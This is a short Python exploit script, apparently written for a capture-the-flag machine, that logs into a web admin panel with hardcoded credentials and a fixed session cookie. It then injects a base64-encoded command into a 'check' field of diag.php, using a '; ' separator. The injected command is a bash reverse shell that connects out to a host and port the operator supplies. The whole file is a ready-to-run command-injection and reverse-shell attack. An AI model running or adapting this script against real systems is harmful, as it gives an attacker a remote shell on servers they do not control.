import requests, base64, argparse, sys

parser = argparse.ArgumentParser(description='Reverse TCP Shell. Made by 0xMurphy')
parser.add_argument('rhost', help='Remote host IP')
args = parser.parse_args()

USERNAME='admin'
PASSWORD='NET_45JDX23'	# Added because box is now inactive
cookie='authBy0xMurphy'

def payload(t):
	return base64.b64encode(('; '+t).encode()).decode()

def authenticate():
	r = requests.post('http://'+args.rhost+'/', data={'username':USERNAME,'password':PASSWORD},cookies={'PHPSESSID':cookie})
	if 'Dashboard' in r.text:
		print('Logged in as admin...')
	else:
		print('Login failed. Retrying...')
		authenticate()

def exploit():
	ip = input('Remote Host: ')
	port = input('Remote Port: ')
	r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
	if '<title>Login</title>' in r.text:
		print('Authentication failed. Reauthenticating...')
		authenticate()
		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})

if __name__ == '__main__':
	exploit()
